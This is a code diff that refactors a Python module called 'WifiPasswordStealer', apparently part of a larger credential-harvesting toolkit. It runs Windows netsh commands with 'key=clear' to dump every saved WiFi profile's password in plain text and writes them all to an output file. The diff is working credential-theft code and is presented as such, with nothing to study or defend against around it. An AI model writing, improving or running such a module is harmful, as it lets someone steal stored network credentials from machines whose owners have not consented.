@@ -1,13 +1,13 @@
 import os
 import subprocess
+from pathlib import Path
 
 from config import ModuleManager
 
 
 class WifiPasswordRecovery(ModuleManager):
     def __init__(self) -> None:
-        super().__init__(module_name = "WifiPasswordStealer")
-        
+        super().__init__(module_name="WifiPasswordStealer", module_path="network/wifi")
         self.banner(r"""
      _______         _  _  _ _       _______ _ 
     |.-----.|       (_)(_)(_|_)     (_______|_)
@@ -18,42 +18,53 @@ class WifiPasswordRecovery(ModuleManager):
   |:::::::::::|\    
   `-=========-`()            Passwords
                     """)
+        
+        self.wifi_passwords_filename: Path = self.module_output / "wifi_passwords.txt"
 
-        self.systeminfo_folder = os.path.join(self.output_folder_user, 'network')
-        self.wifi_passwords_filename = os.path.join(self.systeminfo_folder, 'wifi_passwords.txt')
 
-        if not os.path.isdir(self.systeminfo_folder):
-            os.makedirs(self.systeminfo_folder)
-    
-    def run(self) -> None:
-        with open(self.wifi_passwords_filename, 'w+') as file:
-            self.mdebug(f"Created file and starting to save wifi passwords to it -> {self.wifi_passwords_filename}")
-            self.mdebug(f"Running command: `netsh wlan show profiles`")
-            
+    def _get_wifi_profiles(self) -> list[str]:
+        """Get all available WiFi profiles."""
+        self.mdebug(f"Running command: `netsh wlan show profiles`")
+        
+        try:
             data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
-            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
-            
+            profiles = [line.split(":")[1][1:-1] for line in data if "All User Profile" in line]
             self.mdebug(f"Found a total of {len(profiles)} WiFi networks")
+            return profiles
+        except subprocess.CalledProcessError:
+            self.merror("Error retrieving WiFi profiles")
+            return []
+
+    def _get_wifi_password(self, profile: str) -> str:
+        """Get the password for a given WiFi profile."""
+        try:
+            self.mdebug(f"Running command: `netsh wlan show profile {profile} key=clear`")
+            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
+            password = next((line.split(":")[1][1:-1] for line in results if "Key Content" in line), None)
+            if password:
+                self.mdebug(f"Found password for {profile} WiFi network")
+            else:
+                self.mdebug(f"No password found for {profile} WiFi network")
+            return password or ""
+        except subprocess.CalledProcessError:
+            self.merror(f"Unable to retrieve WiFi password for {profile}")
+            return "ENCODING ERROR"
+        except Exception as e:
+            self.merror(f"Unexpected error while retrieving password for {profile}: {e}")
+            return "ERROR"
+
+    def _save_wifi_passwords(self, profiles: list[str]) -> None:
+        """Save the WiFi passwords to a file."""
+        with open(self.wifi_passwords_filename, 'w+') as file:
+            self.mdebug(f"Created file and starting to save WiFi passwords to it -> {self.wifi_passwords_filename}")
             
-            for i in profiles:
-                try:
-                    self.mdebug(f"Running command: `netsh wlan show profile {i} key=clear`")
-                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
-                    
-                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
-                    try:
-                        self.mdebug(f"Found password of {i} wifi network")
-                        file.write("\n{:<30}|  {:<}".format(i, results[0]))
-                    except IndexError:
-                        self.merror(f"Unable to get the password of {i} network. No password is available -> by Running `netsh wlan show profile {i} key=clear`")
-                        file.write("\n{:<30}|  {:<}".format(i, ""))
+            for profile in profiles:
+                password = self._get_wifi_password(profile)
+                file.write(f"\n{profile:<30}|  {password:<}")
                 
-                except subprocess.CalledProcessError:
-                    self.merror(f"Unable to get the wifi password of {i} network -> Encoding Error")
-                    file.write("\n{:<30}|  {:<}".format(i, "ENCODING ERROR"))
-               
-                except Exception as e:
-                    self.merror(f"Unable to get the wifi password of {i} network -> {e}")
-        
-            self.mdebug(f"Saved all wifi passwords to {self.wifi_passwords_filename}")
-        
+            self.mprint(f"Saved all WiFi passwords to {self.wifi_passwords_filename}")
+
+    def run(self) -> None:
+        profiles = self._get_wifi_profiles()
+        if profiles:
+            self._save_wifi_passwords(profiles)
